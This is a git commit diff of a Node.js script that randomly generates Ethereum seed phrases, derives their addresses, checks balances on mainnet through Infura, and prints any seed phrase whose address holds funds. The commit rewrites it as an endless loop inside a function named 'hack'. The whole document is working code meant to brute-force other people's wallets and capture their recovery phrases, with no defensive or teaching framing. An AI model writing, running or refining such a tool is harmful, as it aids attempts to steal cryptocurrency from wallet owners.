85b3d1f2d8f6496ebf5aa913f9e04dca13b5c997
Daniele Martinelli <60792849+dani69654@users.noreply.github.com>
2020-12-12 23:06:37 +0100

    Update Generate_Addresses_From_Seed.js
    Improved script

--- Generate_Addresses_From_Seed.js
+++ Generate_Addresses_From_Seed.js
@@ -1,55 +1,33 @@
+const eth = require('ethers');
 const Web3 = require('web3');
+const hdkey = require('ethereumjs-wallet/hdkey');
+const bip39 = require('bip39');
 const web3 = new Web3('https://mainnet.infura.io/v3/*Your infura key*');
 
-const bip39 = require('bip39');
-const hdkey = require('ethereumjs-wallet/hdkey');
-
-var wordList = [];
-
-function getWordsFromFile () {
-  require('fs').readFileSync('pathToFile/words.txt', 'utf-8').split(/\r?\n/).forEach(function(line){
-    wordList.push(line);
-  })
-  if(wordList.length > 0) {console.log('Words successfully imported.'); generateMnemonic();}
-  else {console.log('Words not imported.');}
-
-}
-
-function generateMnemonic () {
-  let mnemonic = '';
-  let randomNumber;
-
-  for (let i = 0 ; i < 12; i ++) {
-    randomNumber = Math.floor(Math.random() * wordList.length - 1);
-    mnemonic = mnemonic + wordList[randomNumber] + ' ';
-  }
-  findBalance(mnemonic);
-}
-
-function findBalance (_mnemonic) {
-  const hdwallet = hdkey.fromMasterSeed(bip39.mnemonicToSeedSync(_mnemonic));
-  const path = "m/44'/60'/0'/0/0";
-  const wallet = hdwallet.derivePath(path).getWallet();
-  const address = `0x${wallet.getAddress().toString('hex')}`;
-
-  process.stdout.cursorTo(0);
-  process.stdout.write(`Checking: ${address}`);
-
-  checkBalance ();
-
-  async function checkBalance () {
-    let balance = await web3.eth.getBalance(address);
-    if(balance != 0) {
-      console.log('\n');
-      console.log('mnemonic --->>' + ' '+ _mnemonic)
-      console.log('balance --->>' + ' '+ balance)
-      console.log('\n');
-    } else {
-      generateMnemonic();
+async function hack () {
+    let entropy;
+    let mnemonicPhrase;
+    let hdwallet;
+    const path = "m/44'/60'/0'/0/0";
+    let wallet;
+    let address;
+    let balance;
+    while(true) {
+        entropy = eth.utils.randomBytes(16);
+        mnemonicPhrase = eth.utils.entropyToMnemonic(entropy);
+        hdwallet = hdkey.fromMasterSeed(bip39.mnemonicToSeedSync(mnemonicPhrase));
+        wallet = hdwallet.derivePath(path).getWallet();
+        address = `0x${wallet.getAddress().toString('hex')}`;
+        balance = await web3.eth.getBalance(address);
+        process.stdout.cursorTo(0);
+        process.stdout.write(`Checking: ${address}`);
+        if(balance > 0) {
+            console.log('\n');
+            console.log('mnemonic --->>' + ' '+ mnemonicPhrase)
+            console.log('balance --->>' + ' '+ balance)
+            console.log('\n');
+        }
     }
-  }
 }
 
-
-
-getWordsFromFile();
+hack();
